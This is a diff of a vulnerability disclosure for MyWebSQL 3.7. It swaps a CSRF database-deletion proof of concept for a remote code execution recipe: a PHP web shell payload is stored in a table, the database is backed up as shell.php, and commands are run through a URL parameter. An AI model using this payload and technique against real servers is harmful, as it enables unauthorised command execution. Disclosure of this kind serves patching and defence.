@@ -18,15 +18,11 @@ MyWebSQL version in 3.7 has remote code execution (RCE) vulnerability after writ
 1. Create a test table (code) and write a shell code in this table.
  **Shell code example**: `<?php system($_GET[cmd]); ?>`
 ![](./png/1.png)
-2. Create `MyWebSQL_CSRF_PoC.html` and `MyWebSQL_PoC_iframe.html` file, that purpose is to delete the test database by CSRF.
+2. Execute `Backup Database` function and modify Backup filename as `shell.php`.
 ![](./png/2.png)
+3. Browse `(domain)/mywebsql/backups/shell.php?cmd=XXX`. For instance, `cmd=ipconfig` as below figure.
 ![](./png/3.png)
-3. Execute `MyWebSQL_CSRF_PoC.html` at another domain `chris-hpnb2`.
-![](./png/4.png)
-![](./png/5.png)
-4.	Check result, the test DB has deleted.
-![](./png/6.png)
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMTE4Mjk1NzEzNSwtMTkxNzI5Mzg4NywxMT
-AyNDQ3MDE4XX0=
+eyJoaXN0b3J5IjpbLTE5MDA5MDgwMDgsLTE5MTcyOTM4ODcsMT
+EwMjQ0NzAxOF19
 -->
